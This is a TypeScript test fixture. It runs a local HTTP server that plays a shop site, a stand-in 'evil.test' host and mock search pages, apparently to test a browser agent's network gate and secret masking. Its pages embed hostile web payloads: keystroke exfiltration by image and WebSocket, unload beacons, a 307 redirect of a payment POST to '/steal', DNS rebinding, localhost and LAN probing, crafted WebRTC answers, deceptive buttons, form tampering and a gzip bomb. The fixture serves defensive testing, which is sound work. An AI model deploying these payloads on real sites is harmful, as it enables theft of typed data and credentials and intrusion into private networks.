import { createServer, type IncomingMessage, type Server } from 'node:http';
import { gzipSync } from 'node:zlib';
import type { Egress } from '../src/web/egress.js';

// one local server plays several sites. the host name tells them apart: shop.test is the site of the task, evil.test
// is a site that the task must never reach, and cdn.test serves images. tests map every *.test name to 127.0.0.1.
export interface Fixture {
  port: number;
  url(host: string, path?: string): string;
  hits: Array<{ host: string; method: string; path: string; body: string; agent: string }>;
  hitsOn(host: string): Array<{ method: string; path: string; body: string; agent: string }>;
  // the search pages answer with this mode. ok gives results, captcha and consent give a wall, empty gives no result.
  google: 'ok' | 'captcha' | 'consent' | 'layout' | 'hang';
  close(): Promise<void>;
}

// a password that a page holds. no snapshot, tool output or trace may contain it.
export const FIXTURE_PASSWORD = 'HUNTER2-PASSWORDX';
// the session cookie of shop.test. no trace may contain it.
export const FIXTURE_COOKIE = 'sid=COOKIE-SECRET-7Q';

// the fixture egress allows only the fixture address, so other loopback addresses stand for the owner's network.
export function fixtureEgress(): Egress {
  return {
    resolve: async (host) => (host === 'private.test' ? ['127.0.0.1', '10.0.0.1'] : host.endsWith('.test') ? ['127.0.0.1'] : ['127.0.0.9']),
    addressAllowed: (ip) => ip === '127.0.0.1',
  };
}

const html = (body: string, title = 'page') => `<!doctype html><html><head><title>${title}</title></head><body>${body}</body></html>`;

function readBody(req: IncomingMessage): Promise<string> {
  return new Promise((resolve) => {
    const chunks: Buffer[] = [];
    req.on('data', (c: Buffer) => chunks.push(c));
    req.on('end', () => resolve(Buffer.concat(chunks).toString()));
  });
}

export async function startFixture(): Promise<Fixture> {
  const fixture = { google: 'ok' } as Fixture;
  fixture.hits = [];
  let port = 0;
  const at = (host: string, path = '/') => `http://${host}:${port}${path}`;
  const server: Server = createServer(async (req, res) => {
    const host = (req.headers.host ?? '').split(':')[0]!;
    const path = req.url ?? '/';
    const body = await readBody(req);
    fixture.hits.push({ host, method: req.method ?? 'GET', path, body, agent: req.headers['user-agent'] ?? '' });
    const send = (status: number, text: string, type = 'text/html; charset=utf-8', extra: Record<string, string> = {}) =>
      res.writeHead(status, { 'content-type': type, ...extra }).end(text);
    const route = `${host}${path.split('?')[0]}`;

    if (host === 'evil.test') return send(200, html('<h1>evil</h1>'));
    if (host === 'cdn.test') return send(200, '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"/>', 'image/svg+xml');
    switch (route) {
      case 'shop.test/':
        return send(
          200,
          html(
            `<h1>Shop</h1><img src="${at('cdn.test', '/logo.svg')}" alt="logo">
            <form action="/buy" method="post"><label>Name <input name="name"></label>
              <label>Size <select name="size"><option>S</option><option>M</option></select></label>
              <input type="hidden" name="csrf" value="t0k3n">
              <button type="submit">Buy now</button></form>
            <a href="/about">About</a>
            <a href="${at('evil.test', '/x?leak=1')}">Evil link</a>
            <a href="${at('evil.test', '/popup')}" target="_blank">Evil popup</a>
            <a href="/redir-evil">Redirect link</a>
            <a href="/meta-evil">Meta link</a>
            <button id="js-nav" onclick="location.href='${at('evil.test', '/js?leak=1')}'">Go</button>
            <button id="js-post" onclick="document.getElementById('hidden-form').submit()">Save</button>
            <form id="hidden-form" action="/buy" method="post"><input type="hidden" name="secret" value="from-page"></form>
            <iframe src="${at('evil.test', '/frame')}"></iframe>`,
            'Shop',
          ),
          'text/html; charset=utf-8',
          { 'set-cookie': `${FIXTURE_COOKIE}; Path=/` },
        );
      case 'shop.test/scripts':
        // each button sends data from a script, without a form.
        return send(
          200,
          html(
            `<h1>Scripts</h1>
            <button onclick="fetch('/api/save', { method: 'POST', body: 'from=fetch' })">Fetch post</button>
            <button onclick="const x = new XMLHttpRequest(); x.open('POST', '/api/save'); x.send('from=xhr')">Xhr post</button>
            <button onclick="navigator.sendBeacon('/api/save', 'from=beacon')">Beacon</button>`,
            'Scripts',
          ),
          'text/html; charset=utf-8',
          { 'set-cookie': `${FIXTURE_COOKIE}; Path=/` },
        );
      case 'shop.test/dash': {
        // a page that reaches for the dashboard of the owner on this pc, in each way that a page can.
        const port = new URL(path, 'http://x').searchParams.get('port');
        const hosts = ['localhost', '[::ffff:7f00:1]'];
        return send(
          200,
          html(
            `${hosts.map((h) => `<img src="http://${h}:${port}/logo.png"><iframe src="http://${h}:${port}/#/approvals"></iframe>`).join('')}
            ${hosts.map((h, i) => `<a href="/to-dash?host=${encodeURIComponent(h)}&port=${port}">Dashboard ${i}</a>`).join(' ')}
            <script>fetch('http://localhost:${port}/api/approvals').catch(() => undefined)</script>`,
            'Dash',
          ),
        );
      }
      case 'shop.test/to-dash': {
        const query = new URL(path, 'http://x').searchParams;
        return send(302, '', 'text/plain', { location: `http://${query.get('host')}:${query.get('port')}/#/approvals` });
      }
      case 'shop.test/files':
        return send(200, html('<a href="/invoice.txt">Invoice</a>', 'Files'));
      case 'shop.test/invoice.txt':
        return send(200, 'invoice 42', 'text/plain', { 'content-disposition': 'attachment; filename="invoice.txt"' });
      case 'shop.test/search':
        return send(200, html('<form action="/find" method="get"><input name="q" aria-label="Query" value="shirts"><button type="submit">Search</button></form>', 'Search'));
      case 'shop.test/find':
        return send(200, html(`<h1>Found ${new URL(path, 'http://x').searchParams.get('q')}</h1>`, 'Found'));
      case 'shop.test/workers': {
        // workers that reach for the owner's network (the lan address in the query) and post to an off-list site.
        const lan = new URL(path, 'http://x').searchParams.get('lan');
        const script = `/worker.js?lan=${lan}`;
        return send(
          200,
          html(
            `<p id="shared">no shared worker</p>
            <script>new Worker('${script}');
            if (typeof SharedWorker === 'function') { new SharedWorker('${script}&kind=shared'); document.getElementById('shared').textContent = 'shared worker started'; }</script>`,
            'Workers',
          ),
        );
      }
      case 'shop.test/worker.js': {
        const lan = new URL(path, 'http://x').searchParams.get('lan');
        return send(
          200,
          `fetch('http://127.0.0.5:${lan}/worker-get').catch(() => {});
          fetch('${at('evil.test', '/worker-post')}', { method: 'POST', body: 'worker-DATA', mode: 'no-cors' }).catch(() => {});
          try { new WebSocket('ws://127.0.0.5:${lan}/worker-ws'); } catch {}`,
          'text/javascript',
        );
      }
      case 'shop.test/speculation': {
        // chrome preloads these pages outside the tab, and the activation of a prerender sends no request.
        const lan = new URL(path, 'http://x').searchParams.get('lan');
        const rules = { prerender: [{ source: 'list', urls: [`http://127.0.0.5:${lan}/prerender`, at('evil.test', '/prerender')] }], prefetch: [{ source: 'list', urls: [`http://127.0.0.5:${lan}/prefetch`] }] };
        return send(200, html(`<script type="speculationrules">${JSON.stringify(rules)}</script><a href="${at('evil.test', '/prerender')}">Prerendered</a>`, 'Speculation'));
      }
      case 'shop.test/rebind': {
        // the gate resolves rebind.test to the fixture, and the test makes chrome resolve it to the lan address.
        const lan = new URL(path, 'http://x').searchParams.get('lan');
        return send(200, html(`<img src="http://rebind.test:${lan}/img"><script>fetch('http://rebind.test:${lan}/fetch').catch(() => {})</script>`, 'Rebind'));
      }
      case 'shop.test/tricky':
        // forms whose data set differs from a map of their controls, and forms that a script changes at the click.
        return send(
          200,
          html(
            `<form action="/buy" method="post"><label>To <input name="to" value="mallory@evil.example"></label><label>Copy to <input name="to" value="alice@example.com"></label><button>Send dup</button></form>
            <form action="/buy" method="post"><label>With <select name="with" multiple><option selected>alice</option><option selected>mallory</option></select></label><button>Send multi</button></form>
            <form action="/buy" method="post"><label>Amount <input name="amount" value="5" disabled></label><input type="hidden" name="amount" value="500"><button>Send disabled</button></form>
            <form action="/buy" method="post"><label>Item <input name="item" value="book"></label><label>Amount <input name="amount" value="1"></label><button onpointerdown="this.form.amount.value='500'">Buy on pointer</button></form>
            <form action="/buy" method="post" enctype="multipart/form-data"><label>Note <textarea name="note">line one
line two</textarea></label><label>File <input type="file" name="doc"></label><button>Send multipart</button></form>
            <form action="/buy" method="post" enctype="text/plain"><label>Words <input name="words" value="a=b c"></label><button>Send plain</button></form>
            <form action="/buy" method="post" onsubmit="this.amount.value='500'"><label>Item <input name="item" value="pen"></label><label>Amount <input name="amount" value="1"></label><button>Buy on submit</button></form>`,
            'Tricky',
          ),
        );
      case 'shop.test/pw-frame':
        // the snapshot also shows the fields of a frame, so a password in a frame must be masked too.
        return send(200, html(`<label>Main pw <input type="password" name="pw" value="MAIN-${FIXTURE_PASSWORD}"></label><iframe src="/pw-inner"></iframe>`, 'Frames'));
      case 'shop.test/pw-inner':
        return send(200, html(`<label>Frame pw <input type="password" name="pw" value="${FIXTURE_PASSWORD}"></label>`, 'Inner'));
      case 'shop.test/login':
        return send(
          200,
          html(
            `<form action="/session" method="post"><label>User <input name="user" value="ada"></label>
            <label>Password <input type="password" name="pw" value="${FIXTURE_PASSWORD}"></label><button type="submit">Sign in</button></form>`,
            'Sign in',
          ),
        );
      case 'shop.test/pay':
        return send(200, html('<form action="/pay-go" method="post"><label>Amount <input name="amount" value="5"></label><button type="submit">Pay</button></form>', 'Pay'));
      case 'shop.test/pay-go':
        // a 307 keeps the method and the body, so a post goes on to the off-list host.
        return send(307, '', 'text/plain', { location: at('evil.test', '/steal') });
      case 'shop.test/forms':
        // the text of each button differs from its accessible name, and the first button is hidden from it.
        return send(
          200,
          html(
            `<form action="/order" method="post"><label>Note <input name="note" value="hello"></label>
              <button type="submit" aria-hidden="true" style="opacity:0">Buy now</button></form>
            <form action="/donate" method="post"><input type="hidden" name="amount" value="500">
              <button type="submit" aria-label="Buy now">Donate 500 dollars</button></form>
            <form action="/send" method="post"><label>Message <input name="msg" value="hi"></label>
              <button aria-label="Send message">Send</button></form>`,
            'Forms',
          ),
        );
      case 'shop.test/send':
        return send(200, html(`<h1>Message sent</h1><p>${body}</p>`, 'Sent'));
      case 'shop.test/freeze':
        // the page hangs a moment after the click, when no step runs.
        return send(200, html('<button onclick="setTimeout(() => { for (;;) {} }, 500)">Freeze</button><p>calm</p>', 'Freeze'));
      case 'shop.test/typed':
        // a script sends each key to another site, with an image and a web socket. no form is sent. the page also opens a
        // socket to its own site.
        return send(
          200,
          html(
            `<label>Address <input id="a"></label>
            <script>new WebSocket('${at('shop.test', '/ws-own').replace('http:', 'ws:')}');
            document.getElementById('a').addEventListener('input', (e) => {
              new Image().src = '${at('evil.test', '/img')}?v=' + encodeURIComponent(e.target.value);
              try { new WebSocket('${at('evil.test', '/ws').replace('http:', 'ws:')}?v=' + encodeURIComponent(e.target.value)); } catch {}
            });</script>`,
            'Typed',
          ),
        );
      case 'shop.test/unload':
        // the page sends the typed text when it goes away, to another site and to its own, and it asks to stay.
        return send(
          200,
          html(
            `<label>Note <input id="q"></label>
            <script>
              const go = (tag) => {
                const v = document.getElementById('q').value;
                navigator.sendBeacon('${at('evil.test', '/beacon-')}' + tag, 'typed=' + v);
                fetch('${at('evil.test', '/keepalive-')}' + tag, { method: 'POST', body: 'typed=' + v, keepalive: true }).catch(() => {});
                navigator.sendBeacon('/own-beacon-' + tag, 'typed=' + v);
              };
              addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
              addEventListener('pagehide', () => go('pagehide'));
              addEventListener('unload', () => go('unload'));
              document.addEventListener('visibilitychange', () => document.visibilityState === 'hidden' && go('hidden'));
            </script>`,
            'Unload',
          ),
        );
      case 'shop.test/flood':
        // the gate blocks each post, and the page never stops.
        return send(200, html(`<h1>Flood</h1><script>setInterval(() => { for (let i = 0; i < 20; i++) fetch('/api/x?' + Math.random(), { method: 'POST', body: 'x' }).catch(() => {}); }, 5)</script>`, 'Flood'));
      case 'shop.test/pw-space': {
        // the snapshot changes the white space of a value: it trims it, and it shows a tab or a line separator as a space.
        const values = [` ${FIXTURE_PASSWORD}A `, `${FIXTURE_PASSWORD}B x`, `${FIXTURE_PASSWORD}C\tx`, `-${FIXTURE_PASSWORD}D"x: y`];
        const fields = values.map((_, i) => `<label>P${i} <input type="password" id="p${i}"></label>`).join('');
        return send(200, html(`${fields}<script>${JSON.stringify(values)}.forEach((v, i) => (document.getElementById('p' + i).value = v));</script>`, 'Spaces'));
      }
      case 'shop.test/image-form':
        // with a hash in the address, a script adds a field named like the click position of the image button.
        return send(
          200,
          html(
            `<form action="/buy" method="post"><label>Note <input name="note" value="hello"></label>
              <input type="image" name="go" alt="Go" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" width="40" height="20"></form>
            <form action="/buy" method="post"><label>Item <input name="item" value="pen"></label>
              <input type="image" alt="Order" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" width="40" height="20"></form>
            <script>
              document.forms[0].addEventListener('submit', (e) => {
                if (!location.hash) return;
                const extra = document.createElement('input');
                extra.type = 'hidden'; extra.name = 'go.x'; extra.value = location.hash.slice(1);
                e.target.appendChild(extra);
              });
            </script>`,
            'Image form',
          ),
        );
      case 'shop.test/file-form':
        // with a hash in the address, a script puts content into the empty file field at the click.
        return send(
          200,
          html(
            `<form action="/buy" method="post" enctype="multipart/form-data"><label>Note <input name="note" value="hello"></label>
              <label>Attachment <input type="file" name="f"></label><button>Send</button></form>
            <script>
              document.forms[0].addEventListener('submit', () => {
                if (!location.hash) return;
                const dt = new DataTransfer();
                dt.items.add(new File(['FILE-CONTENT-AT-CLICK'], ''));
                document.querySelector('input[type=file]').files = dt.files;
              });
            </script>`,
            'File form',
          ),
        );
      case 'shop.test/rtc': {
        // a crafted answer: the remote candidate is an address of this pc, and the remote ufrag is text that the page chose.
        const target = new URL(path, 'http://x').searchParams.get('udp');
        return send(
          200,
          html(
            `<h1>rtc</h1><script>
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:${target}' }] });
            pc.createDataChannel('x');
            pc.createOffer().then(async (o) => {
              await pc.setLocalDescription(o);
              const sdp = o.sdp.replace(/a=ice-ufrag:.*\\r\\n/, 'a=ice-ufrag:UFRAGDATA42\\r\\n').replace(/a=ice-pwd:.*\\r\\n/, 'a=ice-pwd:abcdefghijklmnopqrstuvwx\\r\\n').replace('a=setup:actpass', 'a=setup:active');
              await pc.setRemoteDescription({ type: 'answer', sdp });
              const [host, port] = '${target}'.split(':');
              await pc.addIceCandidate({ candidate: 'candidate:1 1 udp 2122260223 ' + host + ' ' + port + ' typ host', sdpMid: '0', sdpMLineIndex: 0 });
            });
            </script>`,
            'Rtc',
          ),
        );
      }
      case 'shop.test/about':
        return send(200, html('<h1>About the shop</h1><p>We sell shirts.</p>', 'About'));
      case 'shop.test/buy':
        return send(200, html(`<h1>Order placed</h1><p>${req.method} ${body}</p>`, 'Done'));
      case 'shop.test/redir-evil':
        return send(302, '', 'text/plain', { location: at('evil.test', '/redirected?leak=1') });
      case 'shop.test/meta-evil':
        return send(200, html(`<meta http-equiv="refresh" content="0;url=${at('evil.test', '/meta?leak=1')}"><p>moving</p>`));
      case 'shop.test/late-evil':
        return send(200, html(`<meta http-equiv="refresh" content="1;url=${at('evil.test', '/late?leak=1')}"><p>moving soon</p>`, 'Late'));
      case 'shop.test/redir-private':
        return send(302, '', 'text/plain', { location: `http://127.0.0.2:${port}/admin` });
      case 'shop.test/hang':
        return send(200, html('<h1>hang</h1><script>setTimeout(() => { for (;;) {} }, 100)</script>', 'Hang'));
      case 'shop.test/article':
        return send(
          200,
          html(
            `<nav><a href="/">Home</a> <a href="/about">About</a></nav><article><h1>Shirts in autumn</h1>
            ${'<p>Cotton shirts keep warm when the days get shorter. Wool is better for the coldest weeks of the year. </p>'.repeat(12)}
            <p>Read <a href="/about">about us</a>.</p></article><footer>footer text</footer>`,
            'Shirts in autumn',
          ),
        );
      case 'shop.test/latin1':
        return res.writeHead(200, { 'content-type': 'text/plain; charset=iso-8859-1' }).end(Buffer.from([0x63, 0x61, 0x66, 0xe9]));
      case 'shop.test/pdf':
        return send(200, '%PDF-1.4 '.repeat(1000), 'application/pdf');
      case 'shop.test/bomb':
        // 50 mb of zeros, about 50 kb on the wire.
        return res.writeHead(200, { 'content-type': 'text/plain', 'content-encoding': 'gzip' }).end(gzipSync(Buffer.alloc(50_000_000)));
      case 'shop.test/slow':
        res.writeHead(200, { 'content-type': 'text/plain' });
        res.write('first part');
        return; // the rest never comes.
      case 'shop.test/loop':
        return send(302, '', 'text/plain', { location: '/loop' });
      case 'shop.test/deep':
        return send(200, html(`${'<div>'.repeat(60_000)}deep text${'</div>'.repeat(60_000)}`));
      case 'shop.test/many':
        return send(200, html(`${'<p>row</p>'.repeat(50_000)}<p>the end</p>`));
      case 'www.google.test/search': {
        if (fixture.google === 'captcha') return send(302, '', 'text/plain', { location: at('www.google.test', '/sorry/index?continue=x') });
        if (fixture.google === 'consent') return send(302, '', 'text/plain', { location: at('consent.google.test', '/ml?continue=x') });
        // the page hangs right after it loads, so only the reader of the results waits for it.
        if (fixture.google === 'hang') return send(200, html('<script>addEventListener("DOMContentLoaded", () => setTimeout(() => { for (;;) {} }, 0))</script><p>wait</p>'));
        if (fixture.google === 'layout') return send(200, html('<div id="main"><span>results moved</span><a href="/x">x</a></div>'));
        const q = new URL(path, 'http://x').searchParams.get('q') ?? '';
        return send(
          200,
          html(
            `<div id="search"><div class="g"><a href="/url?q=${encodeURIComponent('https://shirts.example/autumn')}&sa=U"><h3>Autumn shirts for ${q}</h3></a>
             <div class="VwiC3b">Cotton and wool shirts.</div></div>
             <div class="g"><a href="https://wiki.example/Shirt"><h3>Shirt - Wiki</h3></a><div class="VwiC3b">A shirt is a cloth garment.</div></div></div>`,
            `${q} - Google Search`,
          ),
        );
      }
      case 'www.google.test/sorry/index':
        return send(429, html('<p>Our systems have detected unusual traffic from your computer network.</p><form id="captcha-form"></form>'));
      case 'consent.google.test/ml':
        return send(200, html('<form action="https://consent.google.test/save"><button>Reject all</button><button>Accept all</button></form>'));
      case 'html.duckduckgo.test/html/': {
        const q = new URL(path, 'http://x').searchParams.get('q') ?? '';
        return send(
          200,
          html(
            `<div class="result"><h2><a class="result__a" href="//duckduckgo.com/l/?uddg=${encodeURIComponent('https://shirts.example/ddg')}&rut=1">Shirts on DDG for ${q}</a></h2>
             <a class="result__snippet">Plain shirts.</a></div>`,
          ),
        );
      }
      default:
        return send(404, html('<h1>not found</h1>'));
    }
  });
  // a web socket handshake does not reach the request handler, so it is recorded here with the method UPGRADE.
  server.on('upgrade', (req, socket) => {
    fixture.hits.push({ host: (req.headers.host ?? '').split(':')[0]!, method: 'UPGRADE', path: req.url ?? '/', body: '', agent: req.headers['user-agent'] ?? '' });
    socket.destroy();
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  port = (server.address() as { port: number }).port;
  fixture.port = port;
  fixture.url = at;
  fixture.hitsOn = (host) => fixture.hits.filter((hit) => hit.host === host);
  fixture.close = () =>
    new Promise((resolve) => {
      server.closeAllConnections();
      server.close(() => resolve());
    });
  return fixture;
}
